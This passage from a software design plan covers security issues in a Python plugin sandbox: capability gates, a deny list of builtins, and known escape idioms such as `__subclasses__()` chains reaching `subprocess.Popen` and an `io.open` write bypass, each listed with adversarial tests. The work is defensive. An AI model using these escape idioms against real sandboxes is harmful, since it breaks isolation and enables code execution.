- **Grammar rule-name sanitization (RESOLVED, promoted from uncertainty per Y#4).** The earlier draft flagged this as a tokenization question ("does llguidance handle `math.add`"). Actual issue: Lark rule NAMES (left-hand side of productions) cannot contain dots, but `grammar.py:326` emits `Production(name=f"call_{tool.name}".lower())` verbatim, and `tools.cfg.j2` renders `{{ prod.name }}` unsanitized. Task 10 now specifies `_sanitize_rule_name()` that replaces non-`[a-z0-9_]` chars with underscores, preserves the dotted tool name as a quoted terminal in rule bodies, and fail-fasts on sanitized-name collisions (e.g., `math.add` vs `math_add` both mapping to `call_math_add`).

- **Import-time vs call-time capability gating (RESOLVED as three-gate model option (iii), promoted from ambiguity per Y#6 + Y#6-followup).** Chose Y#6-followup's option (iii) — full separation of declaration vs enforcement:
  1. **Gate 1 — Static AST scan** walks the entire plugin module (top-level + function bodies + class bodies) and validates every import, dynamic-import marker, and forbidden name against `manifest.allow`. `manifest.allow` is consulted ONLY here.
  2. **Gate 2 — `sys.meta_path` finder** materializes capability-mapped modules as `CapabilityScopedModule` wrappers. Does NOT authorize; does NOT consult `manifest.allow` (gate 1 already did) or `effective_grant` (gate 3 will).
  3. **Gate 3 — `CapabilityScopedModule` wrapper** consults `effective_grant` via `_guard` contextvar on every attribute access. Data reads pass through; callable invocations raise `CapabilityDeniedError` when the capability is not granted.
  Rejected option (ii) (my prior iteration) because it had two sources of truth for import authorization (AST scan + finder both consulting `manifest.allow`); option (iii) has one source of truth per concern. Equivalent security properties because gate 1's AST walk is comprehensive (not just top-level). See Task 4 §"Three-gate capability model" and Task 9 §"Approach". **Flag for PRD update**: PRD AC#3/AC#4/§5 should be clarified to explicitly name the option-(iii) three-gate model; team lead may amend the PRD or accept this PRP's interpretation as canonical. Current PRP is authoritative for implementation.

- **`pathlib` / `io` capability bypass via `io.open is builtins.open` aliasing (RESOLVED, promoted from Y#3 sub-issues 3a/3b).** Verified empirically: `io.open is open` returns True, and `pathlib.Path.write_text()` resolves through `io.open`, bypassing any `__builtins__["open"]` wrapper. Granting `pathlib` or `io` to FILESYSTEM_READ therefore yields write escape. Resolution: both modules BANNED from the capability mapping at FS tiers. FS access goes through `fs_read_proxy` / `fs_write_proxy` (new deliverables) or the built-in `open()` (capability-conditionally wrapped). Four total proxy modules now ship in Task 6. See Task 6 §"Approach".

- **Security audit priorities for Task 7 → Task 11 interval (flagged per Y#2-followup).** Sandbox B uses a default-DENY blacklist approach (remove `exec`/`eval`/`compile`/`__import__`/`breakpoint`/`input`) rather than RestrictedPython's canonical safe-builtins whitelist. Classic escape vectors to press on: `type.__mro__[-1].__subclasses__()` reaches `subprocess.Popen` without imports; `().__class__.__base__.__subclasses__()` is the tuple variant. Task 7 adversarial tests include `test_no_rce_via_type_mro_subclasses` and `test_no_rce_via_empty_tuple_class_base_subclasses`. If the `/security-audit-team` concludes whitelist > blacklist is required, that's a Task-4 revision scoped inside the audit — not a re-open of this PRP.

- **`os`-module capability collapse (RESOLVED, promoted from implicit assumption per Y#3).** `os` cannot be granted to any capability without breaking isolation — Sandbox A's `visit_Attribute` (`compile.py:495`) allows non-dunder attribute access, so granting `os` yields full RCE via `os.<system-call>`, `os.<exec-family>`, `os.fork`, etc. Task 6 now bans `os` from `CAPABILITY_MODULES` entirely; filesystem uses `pathlib`, environment uses a tgirl proxy (`env_proxy`), subprocess uses `subprocess` directly + logging proxy. Net new files: `src/tgirl/plugins/capabilities/env_proxy.py`, `src/tgirl/plugins/capabilities/subprocess_proxy.py`.

- **Dynamic import via `importlib.import_module` at plugin call time (post-import).** A plugin loaded with zero capabilities could theoretically call `importlib.import_module("socket")` *from within a function body* at runtime, since the sandbox gates on AST nodes. This attack vector requires the plugin to have access to `importlib`, which is NOT in the safe builtins set. Need to verify during Task 7 adversarial cases and call out explicitly in the security audit.

- **Stdlib scope (Task 8).** Only three placeholder functions in this PRP. The full stdlib is a separate PRD (`stdlib-v1`). This PRP does not adjudicate which functions belong in stdlib — only that the mechanism exists.

- **Telemetry endpoint shape (Task 11).** Exposing `capabilities_granted` in `/telemetry` is useful for audit but exposes which plugins have elevated permissions to any reader of the telemetry endpoint. Consider whether `/telemetry` should be auth-gated — a server with no auth (per Ollama gap analysis) leaks plugin grants to anyone who can hit the endpoint. This is a broader auth question out of scope for this PRP but flagged.

- **Execution under team mode with current hooks.** `block-solo-implementation.sh` will block direct edits on this branch. Execute via `/execute-team`; proposer does the edits, code-reviewer validates each commit.

- **Stdlib autodiscovery + version pinning (RESOLVED, promoted from uncertainty per Y7).** Auto-loaded stdlib set is determined by a hard-coded per-version tool list in `src/tgirl/plugins/stdlib/_versions.py`. Users MAY pin via `[plugins.stdlib] version = N`; unpinned users follow HEAD with a WARN log naming newly registered tools on first start after upgrade. Removed entries under a pinned version fail-fast. See Task 11 §"Stdlib version pinning".

- **Telemetry exposure of `capabilities_granted` (RESOLVED, promoted from uncertainty per Y8).** The field is loopback-only (`client.host in {127.0.0.1, ::1}`); remote callers see it structurally absent. Combined with a startup WARN when `--host != 127.0.0.1` AND `--allow-capabilities` is set, this closes the specific leak without pulling full auth into scope. See Task 11 §"/telemetry privacy gate".

- **Post-import dynamic `__import__` attack (RESOLVED, promoted from uncertainty per Y11).** Earlier PRP drafts dismissed this as "importlib is not in safe builtins" — but Sandbox B's safe-builtins set did not exist at draft time, and functions defined in a plugin body retain references to the original `__builtins__`. Resolution: dual-phase `sys.meta_path` guard (Phase A during import, Phase B during tool-call dispatch via `ToolRegistry.get_callable` wrapper) + register-time AST re-check on function bodies that rejects references to `importlib`, `__import__`, `exec`, `eval`, `compile`, `globals`, `locals`, `vars`, `getattr`, `setattr`, `delattr`, `__builtins__`, `__loader__`, `__spec__`. See Task 4 §2 and §2b. Task 7 ships 5 adversarial tests covering dynamic import at call time, stashed `__builtins__`, `getattr` indirection, and contextvar-leak between calls.

- **`# type: ignore` budget.** PRP targets zero new ignores. If `RestrictedPython` stubs continue missing things in capability-relaxation code, may need 1–2 additional `[misc]` ignores. Flag in commit messages.
